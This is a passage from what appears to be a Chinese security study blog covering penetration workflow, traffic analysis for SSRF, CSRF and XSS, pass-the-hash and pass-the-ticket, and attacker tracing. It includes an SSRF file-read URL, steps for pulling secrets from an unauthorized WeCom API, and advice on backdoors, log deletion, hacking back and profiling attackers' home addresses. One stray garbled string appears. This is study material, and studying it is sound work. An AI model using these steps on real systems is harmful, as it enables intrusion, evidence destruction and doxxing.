<li>MySQL默认端口被修改（最常见）</li>
<li>站库分离</li>
</ul>
<h2 id="那些漏洞经常被用于打点？"><a href="#那些漏洞经常被用于打点？" class="headerlink" title="那些漏洞经常被用于打点？"></a>那些漏洞经常被用于打点？</h2><ul>
<li><p>边界网络设备资产跟弱口令结合</p>
</li>
<li><p>上传漏洞</p>
</li>
<li><p>Log4j</p>
</li>
<li><p>Apache Shiro漏洞</p>
</li>
<li><p>Fastjson漏洞</p>
</li>
<li><p>weblogic，用友 oa</p>
<p>五个步骤，分别是靶标确认、信息收集、漏洞探测、利用漏洞和获取权限，最终要得到的是获取靶标的系统权限进而获得关键数据。</p>
</li>
</ul>
<h2 id="SSRF服务器端请求伪造攻击流量如何分析"><a href="#SSRF服务器端请求伪造攻击流量如何分析" class="headerlink" title="SSRF服务器端请求伪造攻击流量如何分析"></a>SSRF服务器端请求伪造攻击流量如何分析</h2><p>查看url上是否有file协议&#x2F;gopher协议&#x2F;ftp协议&#x2F;dict协议<br>例  <a target="_blank" rel="noopener" href="http://127.0.0.1/pikachu/vul/ssrf/ssrf_curl.php?url=file:///c:/windows/system.ini%EF%BC%88%E8%8E%B7%E5%8F%96%E6%9C%AC%E5%9C%B0c%E7%9B%98%E7%9A%84system.ini%E6%96%87%E4%BB%B6%EF%BC%89">http://127.0.0.1/pikachu/vul/ssrf/ssrf_curl.php?url=file:///c:/windows/system.ini（获取本地c盘的system.ini文件）</a></p>
<pre><code> 2、查看url地址后面一些参数
</code></pre>
<p>(share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain等）这些参数后面的值是不是内网的IP地址或者是127.0.0.1或者是一些协议的一些关键字眼。</p>
<pre><code>3、参数值后面存在特殊字符
</code></pre>
<p>这些参数值的后面是否有特殊字符（绕过ssrf会使用一些特殊字符eg：‘。’‘[: :]’等一些特殊的字符），也可能出现各种编码&#x2F;进制进行写IP地址，或者特殊的域名eg：xip.io。<br>是否出现file_get_contents()、fsockopen()、curl_exec()等函数</p>
<h2 id="CSRF服务器端请求伪造攻击流量如何分析"><a href="#CSRF服务器端请求伪造攻击流量如何分析" class="headerlink" title="CSRF服务器端请求伪造攻击流量如何分析"></a>CSRF服务器端请求伪造攻击流量如何分析</h2><p>可以通过请求中referrer字段盘带是否从其他网站跳转而来，或者结合实际情况观察请求中是否存在csrf token来判断是否为csrf攻击</p>
<p>1.如何在大量请求中快速找到攻击会话<br>查看http协议交互日志，通过搜寻容易携带攻击指令的字段</p>
<p>2.如何通过流量分析发现网络中的xss攻击<br>通过对客户端访问网页的流量进行分析，寻找几个特征（返回包和请求包相同的攻击语句，返回包的语句包在script等标签内，攻击语句未被转义）</p>
<p>3.如何发现针对web网站的目录遍历攻击<br>搜索关键字..&#x2F;或者~&#x2F;</p>
<h2 id="给你一个网站如何渗透"><a href="#给你一个网站如何渗透" class="headerlink" title="给你一个网站如何渗透"></a>给你一个网站如何渗透</h2><h3 id="1、信息收集"><a href="#1、信息收集" class="headerlink" title="1、信息收集"></a>1、信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a. 服务器的相关信息（真实 ip，系统类型，版本，开放端口，WAF 等）</span><br><span class="line">b. 网站指纹识别（包括，cms，cdn，证书等），dns 记录</span><br><span class="line">c. whois 信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等）</span><br><span class="line">d. 子域名收集，旁站查询(有授权可渗透)，C 段等</span><br><span class="line">e. google hacking 针对化搜索，pdf 文件，中间件版本，弱口令扫描等</span><br><span class="line">f. 扫描网站目录结构，爆后台，网站 banner，测试文件，备份等敏感文件泄漏等</span><br><span class="line">i. 传输协议，通用漏洞，exp，github 源码等</span><br></pre></td></tr></table></figure>

<h4 id="判断操作系统的类型"><a href="#判断操作系统的类型" class="headerlink" title="判断操作系统的类型"></a>判断操作系统的类型</h4><p>Windows大小写不敏感<br>Linux大小写敏感</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www.lottost.cn/index.html</span><br><span class="line">www.lottost.cn/index.HTML</span><br></pre></td></tr></table></figure>

<p>如果都能识别说明是Windows<br>否则是Linux</p>
<h4 id="社工类的信息"><a href="#社工类的信息" class="headerlink" title="社工类的信息"></a>社工类的信息</h4><p>通过查阅网站的页面内容<br>管理员的邮箱（联系我们）<br>电话号码<br>企业的名称</p>
<h4 id="判断网站开发使用框架"><a href="#判断网站开发使用框架" class="headerlink" title="判断网站开发使用框架"></a>判断网站开发使用框架</h4><p>在开发过程中使用的框架可能会存一些已知的漏洞<br>漏洞会被继承<br>比如dedecmsi这个框架，在网上可以找到相关的漏洞信息<br>判断网站使用框架的工具：</p>
<ul>
<li>御剑web指纹识别系统</li>
<li>云悉在线指纹识别系统</li>
<li>kali的whatweb工具</li>
</ul>
<h4 id="目录扫描和查找"><a href="#目录扫描和查找" class="headerlink" title="目录扫描和查找"></a>目录扫描和查找</h4><p>御剑孤独后台扫描工具</p>
<h4 id="google-hack语去"><a href="#google-hack语去" class="headerlink" title="google hack语去"></a>google hack语去</h4><p>检测网站的信息<br>inurl、intext、intitle、filetype、site</p>
<h4 id="github网站"><a href="#github网站" class="headerlink" title="github网站"></a>github网站</h4><p>代码托管平台</p>
<h4 id="ip地址查询"><a href="#ip地址查询" class="headerlink" title="ip地址查询"></a>ip地址查询</h4><ul>
<li>nslooup手工域名解析</li>
<li>ping命令</li>
<li>站长之家ping</li>
<li><a target="_blank" rel="noopener" href="http://ip138.com/">ip138.com</a></li>
</ul>
<h4 id="判断网站是否使用了cdn加速"><a href="#判断网站是否使用了cdn加速" class="headerlink" title="判断网站是否使用了cdn加速"></a>判断网站是否使用了cdn加速</h4><p><a target="_blank" rel="noopener" href="http://ip138.com/">ip138.com</a> ping检测<br>如果使用了CDN加速的话，可以通过访问子域名的式绕过CDN加速服务器。</p>
<h4 id="判断主域名下的子域名"><a href="#判断主域名下的子域名" class="headerlink" title="判断主域名下的子域名"></a>判断主域名下的子域名</h4><p>layer-子域挖掘机</p>
<h4 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h4><ul>
<li>-p,-sV,-sn,-O</li>
<li>kali系统中的nmap</li>
<li>判断多台主机的活动状态</li>
<li>查看主机的指纹信息</li>
<li>查看主机运行的服务的版本信息</li>
</ul>
<h4 id="钟馗之眼搜索语法"><a href="#钟馗之眼搜索语法" class="headerlink" title="钟馗之眼搜索语法"></a>钟馗之眼搜索语法</h4><ul>
<li>app:应用的名称</li>
<li>ver:版本</li>
<li>pot:端口</li>
<li>OS:操作系统</li>
<li>service:服务名称</li>
<li>country:国家</li>
<li>可以搜索网络中的硬件如网络摄像头</li>
<li>Jaws&#x2F;1.0</li>
<li><a target="_blank" rel="noopener" href="http://也可以使用shodan.io/">也可以使用shodan.io</a></li>
</ul>
<h4 id="信息收集网站"><a href="#信息收集网站" class="headerlink" title="信息收集网站"></a>信息收集网站</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">域名信息</span><br><span class="line">站长之家：http://whois.chinaz.com/</span><br><span class="line">爱站网：https://whois.aizhan.com/</span><br><span class="line">万网：https://wanwang.aliyun.com/</span><br><span class="line">IANA WHOIS Service：https://www.iana.org/whois</span><br><span class="line">法人姓名查询：</span><br><span class="line">爱站网SEO：https://www.aizhan.com/cha/</span><br><span class="line">公司负责人邮箱电话查询：</span><br><span class="line">天眼查：https://www.tianyancha.com/</span><br><span class="line"></span><br><span class="line">子域名信息</span><br><span class="line">在线查询：</span><br><span class="line">谷歌/百度等语法搜索：site: baidu.com</span><br><span class="line">站长之家：http://tool.chinaz.com/subdomain/</span><br><span class="line">在线二级域名子域名查询：http://tools.bugscaner.com/subdomain/?domain</span><br><span class="line">在线子域名查询-接口光速版：http://sbd.ximcx.cn/</span><br><span class="line">网址：https://dnsdb.io/zh-cn/</span><br><span class="line">工具：</span><br><span class="line">子域名挖掘机</span><br><span class="line">sublist3r等</span><br><span class="line"></span><br><span class="line">指纹信息</span><br><span class="line">WEB指纹：Web指纹也叫web应用指纹。由于所使用的工具、技术、实现方式等因素的影响，每个web网站都形成了一些独有的特点，我们把这样的特点叫做web应用指纹，只有识别出相应的Web容器或者CMS，才能查找与其相关的漏洞，然后才能进行相应的渗透操作。</span><br><span class="line">Wappalyzer火狐浏览器插件</span><br><span class="line">AWVS中的指纹识别</span><br><span class="line">whatweb在线网站：http://whatweb.bugscaner.com/look/</span><br><span class="line">Finger-P指纹识别：https://fp.shuziguanxing.com/#/</span><br><span class="line">云悉指纹识别：https://www.yunsee.cn/</span><br><span class="line">whatweb工具识别站点指纹信息</span><br><span class="line"></span><br><span class="line">端口信息</span><br><span class="line">需要知道目标服务器开放了哪些端口，常见的如 135 、137 、138 、139 、445，这几个端口经常爆发漏洞。以下是一些服务端口的漏洞：</span><br><span class="line">22——&gt;ssh弱口令</span><br><span class="line">873——&gt;rsync 未授权访问漏洞</span><br><span class="line">3306——&gt;mysql弱口令</span><br><span class="line">6379——&gt;redis未授权访问漏洞</span><br><span class="line"></span><br><span class="line">公司敏感信息</span><br><span class="line">比如，公司的邮箱格式，公司的员工姓名，以及与该公司有关的任何信息。并且，我们还可以去Github、码云等代码托管平台上查找与此有关的敏感信息，有些粗心的程序员在将代码上传至代码托管平台后，并没有对代码进行脱敏处理。导致上传的代码中有包含如数据库连接信息、邮箱密码、还有可能有泄露的源代码等。</span><br><span class="line"></span><br><span class="line">网站敏感目录和文件</span><br><span class="line">扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏</span><br><span class="line">后台目录：弱口令，万能密码，爆破</span><br><span class="line">安装包：获取数据库信息，甚至是网站源码</span><br><span class="line">上传目录：截断、上传图片马等</span><br><span class="line">mysql管理接口：弱口令、爆破，万能密码，然后脱裤，甚至是拿到shell</span><br><span class="line">安装页面 ：可以二次安装进而绕过</span><br><span class="line">phpinfo：会把你配置的各种信息暴露出来</span><br><span class="line">编辑器：fck、ke、等</span><br><span class="line">iis短文件利用：条件比较苛刻  windows、apache等</span><br><span class="line">探测目标网站后台目录的工具有： wwwscan 、御剑 、 dirbuster、cansina 等</span><br><span class="line"></span><br><span class="line">查找真实IP</span><br><span class="line">ping域名</span><br><span class="line">nslookup</span><br><span class="line">站长之家等：http://ip.tool.chinaz.com/</span><br><span class="line">CDN：全称是Content Delivery Network，即内容分发网络。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术</span><br><span class="line">在线网站查询：</span><br><span class="line">如站长之家PING测试：http://ping.chinaz.com/</span><br><span class="line">查询历史DNS解析记录：https://site.ip138.com/</span><br><span class="line"></span><br><span class="line">站点目录扫描</span><br><span class="line">AWVS具有站点爬取功能</span><br><span class="line">burp Target 的 Site map模块</span><br><span class="line">御剑</span><br><span class="line">DirBuster 是一个多线程的基于Java的应用程序设计用于暴力破解Web 应用服务器上的目录名和文件名的工具</span><br><span class="line">google语法</span><br><span class="line">robots文件</span><br><span class="line"></span><br><span class="line">整站分析</span><br><span class="line">（1）服务器类型(Linux/Windows)：最简单就是通过ping来探测，Windows的TTL值都是一般是128，Linux则是64。所以大于100的肯定是Windows，而几十的肯定是Linux。</span><br><span class="line">（2）判断目标网站服务器的具体的版本，可以采用 nmap 进行扫描， -O 和 -A 参数都能扫描出来</span><br><span class="line">（3）网站容器(Apache/Nginx/Tomcat/IIS)：需要知道网站用的web服务器是什么类型的：Apache、Nginx、Tomcat 还是 IIS。知道了web服务器是哪种类型后，我们还要探测web服务器具体的版本。比如Ngnix版本&lt;0.83会有解析漏洞 ，IIS6.0会有文件名解析漏洞、IIS7.0会有畸形解析漏洞等。不同的web服务器版本，存在着不同漏洞。</span><br><span class="line">探测网站是哪种web服务器，可以使用工具 whatweb  。</span><br><span class="line">（4）脚本类型(php/jsp/asp/aspx)</span><br><span class="line">1：可以根据网站URL来判断</span><br><span class="line">2：site:xxx  filetype:php</span><br><span class="line">3：可以根据Firefox的插件来判断（wappalyzer）</span><br><span class="line">（5）数据库类型(Mysql/Oracle/Accees/Mqlserver)</span><br><span class="line">我们需要知道网站用的是哪种类型的数据库：Mysql、Oracle、SqlServer 还是 Access 。虽然这几种数据库的语法大体上相同，但是还是有区别的。所以我们还是要知道目标网站用的是哪种数据库，并且数据库是哪个版本的</span><br><span class="line"></span><br><span class="line">常见搭配：</span><br><span class="line">ASP 和 ASPX：ACCESS、SQL Server</span><br><span class="line">PHP：MySQL、PostgreSQL</span><br><span class="line">JSP：Oracle、MySQL</span><br><span class="line"></span><br><span class="line">C段和旁站</span><br><span class="line">旁站指的是同一服务器上的其他网站，很多时候，有些网站可能不是那么容易入侵。那么，可以查看该网站所在的服务器上是否还有其他网站。如果有其他网站的话，可以先拿下其他网站的webshell，然后再提权拿到服务器的权限，最后就自然可以拿下该网站了</span><br><span class="line"></span><br><span class="line">C段指的是同一内网段内的其他服务器，每个IP有ABCD四个段，举个例子，192.168.0.1。</span><br><span class="line"></span><br><span class="line">A段就是192，B段是168，C段是0，D段是1，而C段嗅探的意思就是拿下它同一C段中的其中一台服务器，也就是说是D段1-255中的一台服务器，然后利用工具嗅探拿下该服务器。</span><br><span class="line"></span><br><span class="line">旁站和C段在线查询地址：</span><br><span class="line">站长之家查询：http://stool.chinaz.com/same</span><br><span class="line">webscan在线查询：https://webscan.cc/</span><br></pre></td></tr></table></figure>



<h3 id="2、制定攻击计划"><a href="#2、制定攻击计划" class="headerlink" title="2、制定攻击计划"></a>2、制定攻击计划</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用已知的信息，制定一份目标可能存在漏洞地方的攻击计划</span><br></pre></td></tr></table></figure>

<h3 id="3、漏洞测试"><a href="#3、漏洞测试" class="headerlink" title="3、漏洞测试"></a>3、漏洞测试</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">top10漏洞</span><br><span class="line">中间件漏洞</span><br><span class="line">最新爆出来的漏洞</span><br></pre></td></tr></table></figure>

<h3 id="4、漏洞利用，权限提升"><a href="#4、漏洞利用，权限提升" class="headerlink" title="4、漏洞利用，权限提升"></a>4、漏洞利用，权限提升</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">通过漏洞拿到web的权限</span><br><span class="line">然后提升到最高权限</span><br></pre></td></tr></table></figure>

<h3 id="5、权限维持"><a href="#5、权限维持" class="headerlink" title="5、权限维持"></a>5、权限维持</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过创建后门、账户、计划任务等方式，达到权限维持</span><br></pre></td></tr></table></figure>

<h3 id="6、内网扫描"><a href="#6、内网扫描" class="headerlink" title="6、内网扫描"></a>6、内网扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过相关的工具、命令，进行内网主机、端口探测，明文信息收集</span><br></pre></td></tr></table></figure>

<h3 id="7、建立隧道代理"><a href="#7、建立隧道代理" class="headerlink" title="7、建立隧道代理"></a>7、建立隧道代理</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过msf或者nc等相关代理工具，建立隧道</span><br></pre></td></tr></table></figure>

<h3 id="8、内网攻击、权限提升"><a href="#8、内网攻击、权限提升" class="headerlink" title="8、内网攻击、权限提升"></a>8、内网攻击、权限提升</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过漏洞拿到一个账户，然后进行利用，提权</span><br></pre></td></tr></table></figure>

<h3 id="9、痕迹清理"><a href="#9、痕迹清理" class="headerlink" title="9、痕迹清理"></a>9、痕迹清理</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">删除相关的web、系统日志</span><br></pre></td></tr></table></figure>

<h2 id="PTT-PTH"><a href="#PTT-PTH" class="headerlink" title="PTT  PTH"></a>PTT  PTH</h2><h3 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h3><p>pass-the-hash在内网渗透中是一种很经典的攻击方式，原理就是攻击者可以直接通过LM Hash和NTLM Hash访问远程主机或服务，而不用提供明文密码。<br>pass the hash原理：<br>* 在Windows系统中，通常会使用NTLM身份认证<br>* NTLM认证不使用明文口令，而是使用口令加密后的hash值，hash值由系统API生成(例如LsaLogonUser)<br>* hash分为LM hash和NT hash，如果密码长度大于15，那么无法生成LM hash。从Windows Vista和Windows Server 2008开始，微软默认禁用LM hash<br>* 如果攻击者获得了hash，就能够在身份验证的时候模拟该用户(即跳过调用API生成hash的过程)<br>这类攻击适用于：<br>* 域&#x2F;工作组环境<br>* 可以获得hash，但是条件不允许对hash爆破<br>* 内网中存在和当前机器相同的密码</p>
<h3 id="PTT"><a href="#PTT" class="headerlink" title="PTT"></a>PTT</h3><p>ptt攻击的部分就不是简单的NTLM认证了，它是利用Kerberos协议进行攻击的，这里就介绍三种常见的攻击方法：<br>MS16-068，Golden ticket，SILVER ticket。<br>之前介绍了Kerberos协议具体工作方法，在域中，简要介绍一下：<br>* 客户机将明文密码进行NTLM哈希,然后和时间戳一起加密(使用krbtgt密码hash作为密钥)，发送给kdc（域控），kdc对用户进行检测，成功之后创建TGT(Ticket-Granting Ticket)<br>* 将TGT进行加密签名返回给客户机器，只有域用户krbtgt才能读取kerberos中TGT数据<br>* 然后客户机将TGT发送给域控制器KDC请求TGS（票证授权服务）票证，并且对TGT进行检测<br>* 检测成功之后，将目标服务账户的NTLM以及TGT进行加密，将加密后的结果返回给客户机。</p>
<h2 id="溯源反制"><a href="#溯源反制" class="headerlink" title="溯源反制"></a>溯源反制</h2><p><strong>没有进攻和威胁的被动防守，是注定失败的</strong></p>
<h3 id="攻击源捕获"><a href="#攻击源捕获" class="headerlink" title="攻击源捕获"></a>攻击源捕获</h3><ul>
<li>安全设备报警，如扫描IP、威胁阻断、病毒木马、入侵事件等</li>
<li>日志与流量分析，异常的通讯流量、攻击源与攻击目标等</li>
<li>服务器资源异常，异常的文件、账号、进程、端口，启动项、计划任务和服务等</li>
<li>邮件钓鱼，获取恶意文件样本、钓鱼网站URL等</li>
<li>蜜罐系统，获取攻击者行为、意图的86799iukhjgkgbv相关信息</li>
</ul>
<h3 id="溯源反制手段"><a href="#溯源反制手段" class="headerlink" title="溯源反制手段"></a>溯源反制手段</h3><h4 id="IP定位技术"><a href="#IP定位技术" class="headerlink" title="IP定位技术"></a>IP定位技术</h4><p>根据IP定位物理地址—代理IP</p>
<p>溯源案例：通过IP端口扫描，反向渗透服务器进行分析，最终定位到攻击者相关信息</p>
<h4 id="ID追踪术"><a href="#ID追踪术" class="headerlink" title="ID追踪术"></a>ID追踪术</h4><p>ID追踪术，搜索引擎、社交平台、技术论坛、社工库匹配</p>
<p>溯源案例：利用ID从技术论坛追溯邮箱，继续通过邮箱反追踪真实姓名，通过姓名找到相关简历信息</p>
<h4 id="网站url"><a href="#网站url" class="headerlink" title="网站url"></a>网站url</h4><p>域名Whois查询—注册人姓名、地址、电话和邮箱。—域名隐私保护</p>
<p>溯源案例：通过攻击IP历史解析记录&#x2F;域名，对域名注册信息进行溯源分析</p>
<h4 id="恶意样本"><a href="#恶意样本" class="headerlink" title="恶意样本"></a>恶意样本</h4><p>提取样本特征、用户名、ID、邮箱、C2服务器等信息—同源分析</p>
<p>溯源案例：样本分析过程中，发现攻击者的个人ID和QQ，成功定位到攻击者。</p>
<h4 id="社交账号"><a href="#社交账号" class="headerlink" title="社交账号"></a>社交账号</h4><p>基于JSONP跨域，获取攻击者的主机信息、浏览器信息、真实 IP及社交信息等</p>
<p>利用条件：可以找到相关社交网站的jsonp接口泄露敏感信息，相关网站登录未注销</p>
<h3 id="攻击者画像"><a href="#攻击者画像" class="headerlink" title="攻击者画像"></a>攻击者画像</h3><h4 id="攻击路径"><a href="#攻击路径" class="headerlink" title="攻击路径"></a>攻击路径</h4><p>攻击目的：拿到权限、窃取数据、获取利益、DDOS等</p>
<p>网络代理：代理IP、跳板机、C2服务器等</p>
<p>攻击手法：鱼叉式邮件钓鱼、Web渗透、水坑攻击、近源渗透、社会工程等</p>
<h4 id="攻击者身份画像"><a href="#攻击者身份画像" class="headerlink" title="攻击者身份画像"></a>攻击者身份画像</h4><p> 虚拟身份：ID、昵称、网名</p>
<p> 真实身份：姓名、物理位置</p>
<p> 联系方式：手机号、qq&#x2F;微信、邮箱</p>
<p> 组织情况：单位名称、职位信息</p>
<h3 id="思路总结"><a href="#思路总结" class="headerlink" title="思路总结"></a>思路总结</h3><p>1.首先通过系统日志、安全设备截获攻击包等从中分析出攻击者的ip和攻击方式<br>2.通过webshell或者木马去微步分析，或者去安恒威胁情报中心进行ip检测分析，是不是云服务器，基站等，<br>3.如果是云服务器的话可以直接反渗透，看看开放端口，域名，whois等进行判断，获取姓名电话等丢社工库看看能不能找到更多信息然后收工<br>4.获取到攻击IP后，先试用IP反查，查询此IP是否存在邮箱，手机信息泄露之类的，通过邮箱，手机号去获取攻击者信息。在获取到手机号，邮箱的情况下，使用各种社交软件，攻击者可能使用的手机号，邮箱就是自己正在使用的，因此购物平台搜索是否存在此用户。最终还原出攻击者身份画像，找到攻击者姓名、物理位置、家庭住址、手机号、单位名称、职位信息。</p>
<h3 id="rdns"><a href="#rdns" class="headerlink" title="rdns"></a>rdns</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.ipip.net/ip.html</span><br></pre></td></tr></table></figure>

<h3 id="备案信息查询"><a href="#备案信息查询" class="headerlink" title="备案信息查询"></a>备案信息查询</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipwhois.cnnic.net.cn</span><br></pre></td></tr></table></figure>

<h3 id="地址查询"><a href="#地址查询" class="headerlink" title="地址查询"></a>地址查询</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">高德地图</span><br><span class="line">修改X-F头的IP，可以定位到地址</span><br><span class="line">http://www.ipip.net/ip.html</span><br></pre></td></tr></table></figure>

<h3 id="C段查询"><a href="#C段查询" class="headerlink" title="C段查询"></a>C段查询</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://search.censys.io/</span><br><span class="line">    正常静态网址会分配四个IP给购买者，这四个IP是连续的</span><br></pre></td></tr></table></figure>

<h3 id="国外网站"><a href="#国外网站" class="headerlink" title="国外网站"></a>国外网站</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://myip.ms/</span><br><span class="line">https://www.virustotal.com/gui/home/upload</span><br></pre></td></tr></table></figure>

<h3 id="如何判断是否是docker"><a href="#如何判断是否是docker" class="headerlink" title="如何判断是否是docker"></a>如何判断是否是docker</h3><p>当拿到shell权限，看到数字和字母随机生成的主机名大概率猜到在容器里了，查看进程，进程数很少，PID为1的进程为业务进程，这也是容器环境的典型特征</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/1/cgroup</span><br></pre></td></tr></table></figure>

<p>通过判断根目录下的 .dockerenv文件是否存在，可以简单的识别docker环境。</p>
<p>K8s&amp;docker环境下：ls -alh &#x2F;.dockerenv 可以找到文件。</p>
<h3 id="企业微信"><a href="#企业微信" class="headerlink" title="企业微信"></a>企业微信</h3><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><blockquote>
<p>FOFA语法：app&#x3D;“Tencent-企业微信”</p>
</blockquote>
<p>这里访问路径为：<a target="_blank" rel="noopener" href="https://xx.xx.xx.xx/cgi-bin/gateway/agentinfo%E8%BF%99%E6%A0%B7%E7%9A%84%E8%AE%BF%E9%97%AE%E6%A0%BC%E5%BC%8F%E3%80%82">https://xx.xx.xx.xx/cgi-bin/gateway/agentinfo这样的访问格式。</a></p>
<p><img src="/photo/a20d51b09a4449e0990e6ecd9aa4b1fc.png" alt="在这里插入图片描述"></p>
<p>接口未授权情况下可直接获取企业微信secret等敏感信息，可导致企业微信全量数据被获取，文件获取、使用企业微信轻应用对内力量发送钓鱼文件和链接等风险临时缓释措施为将&#x2F;cgi-bin.gateway&#x2F;agentinfo在WAF上进行阻断，具体可联系企业微信团队进行应急，请各单位加强防范。</p>
<h4 id="获取token"><a href="#获取token" class="headerlink" title="获取token"></a>获取token</h4><blockquote>
<p>xxx.com&#x2F;cgi-bin&#x2F;gettoken?corpid&#x3D;strcorpid&amp;corpsecret&#x3D;Secret</p>
</blockquote>
<h4 id="带入token请求功能接口"><a href="#带入token请求功能接口" class="headerlink" title="带入token请求功能接口"></a>带入token请求功能接口</h4><p>举例：获取标签成员</p>
<blockquote>
<p>xxx.com&#x2F;cgi-bin&#x2F;user&#x2F;list?<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=access_token&spm=1001.2101.3001.7020">access_token</a>&#x3D;access_token</p>
</blockquote>
<p>access_token为3.2获取的值</p>
<h3 id="EDR"><a href="#EDR" class="headerlink" title="EDR"></a>EDR</h3><p>edr是老生常谈了，有多少安服仔曾经被天擎支配过呢。老样子，先上某度百科：</p>
<p>端点检测和响应（EDR）是一种技术形式，可对针对企业网络和系统的高级网络安全威胁提供持续监控和响应。</p>
<p>很多人第一反应是edr就是个杀软嘛，其实对，也不对。先从技术层面，edr可检测的威胁不仅限于恶意病毒之类的，更强调行为上的阻断，更全面。而从架构部署上，edr是企业方案，注重主动性与防御性，其实说通俗点，edr在网络架构上有服务器，传统杀软把一切集中在一台主机上，而edr是通过网络区域内主机与服务器的连接来构成一个整体，edr强调的是网络内主机的安全。</p>
<p>edr产品</p>
<p>Edr只是个概念，落实到产品上各家安全厂商都有自己的利器，先来说说鼠鼠用过的，某深x服的和微某步的edr都用过，还有某一所的，天擎也不用说了，九成九的安服仔都用过，大家感兴趣的都可以去官方主页搜一下。</p>
<p>重点说说目前大部分edr产品的一个特点，首先是安装问题，edr产品进入一个企业时，不大可能是从零开始的，啥意思呢，一台台装起来真麻烦啊。。。。涉及到一些不太好处理的问题时，客户就会嚷嚷着不会弄要找技术人员了，鼠鼠就和同事们熬夜装过edr。</p>
<p>部分企业可能会有终端管理手段，可能会有软件推送或者统一安装之类的方法，但是实测，首要的一个前提就是edr安全包支持静默安装（这个目前遇到的都有，但是不好说不敢保证。）</p>
<p>其次就是协同的问题，因为要占用主机性能，也需要一定时间，如果有需要的话基本都是安服冤种们下了班一个个装上去了。</p>
